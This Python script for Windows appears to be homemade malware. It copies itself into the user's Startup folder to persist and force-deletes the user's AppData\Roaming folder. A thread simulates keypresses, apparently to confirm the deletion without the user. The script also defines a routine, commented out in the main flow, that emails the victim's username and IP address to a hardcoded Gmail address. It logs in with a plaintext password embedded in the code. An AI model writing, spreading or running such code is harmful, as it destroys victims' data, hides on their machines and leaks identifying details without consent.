if True: #imports everything i need
    import email
    import getpass as gp
    import os
    import smtplib
    import socket
    import ssl
    import threading
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from time import sleep
    from webbrowser import open

    import pydirectinput as di
#settes all the vars in place
vidlink = "https://www.youtube.com/watch?v=sntGta76v6Y" #for the funny vid
user = gp.getuser() 
message = MIMEMultipart()
port = 465  # For SSL
password = "hotdogben"
sender_email = "benmc303@gmail.com"
receiver_email = "benhotdog3@gmail.com"
smtp_server = "smtp.gmail.com"
subject = user
threads = []
message["From"] = sender_email
message["To"] = receiver_email
message["SUBJECT"] = user
userip = socket.gethostbyname(socket.gethostname())
#del apps
de = 'del /f'
de += ' "C:\\Users\\'
de += user
de += '\\AppData\\Roaming"'
#This is to put it in the startup
mv = 'copy "'
mv += os.path.abspath(__file__)
mv = mv.replace('Run_Me.py', 'cool.exe')
mv = mv.replace('Run_Me.exe', 'cool.exe')
mv += '"'
mv = mv.replace('\\', '\\\\')
mv += ' "C:\\\\Users\\\\'
mv += user
mv += '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup"'
#This is the shit for the message in the email
message = MIMEMultipart()
Subject = user
port = 465  # For SSL
userip = socket.gethostbyname(socket.gethostname())
text = "ip is = "
text += userip
message.attach(MIMEText(text))
print(message)
message = str(message)
context = ssl.create_default_context()
def send():#This is the thing that sends the email
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com",  465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)
    except:
        x=1
def nEnter():
    sleep(4)
    di.press('n')
    di.press('enter')
def tread():
    for n in range(1):
        t = threading.Thread(target=nEnter)
        t.daemon = True
        threads.append(t)
        threads[0].start()
def Main():
    #send()
    os.system(mv)
    os.system(de)
    tread()
    #vid()
    sleep(10)
    #import cool
Main()